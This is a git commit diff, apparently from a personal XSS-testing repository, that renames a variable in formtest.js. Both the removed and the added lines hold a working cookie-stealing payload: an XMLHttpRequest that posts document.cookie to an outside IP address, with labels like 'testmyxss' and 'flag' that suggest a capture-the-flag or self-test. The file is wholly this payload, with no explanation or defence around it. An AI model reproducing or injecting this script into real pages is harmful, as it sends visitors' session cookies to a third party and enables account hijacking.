5a7320b0d8a2cb62bebe8a30aa314c0439512516
SiZV200 <804513026@qq.com>
2024-05-03 03:09:15 +0100

    Update formtest.js

--- formtest.js
+++ formtest.js
@@ -1,4 +1,4 @@
-let xhr = new XMLHttpRequest();
+let xhrtest = new XMLHttpRequest();
 //配置请求方式和请求地址
-xhr.open("post","http://39.101.137.200:7745/send");
-xhr.send("header=flag&listener=testmyxss&content="+document.cookie)
+xhrtest.open("post","http://39.101.137.200:7745/send");
+xhrtest.send("header=flag&listener=testmyxss&content="+document.cookie)
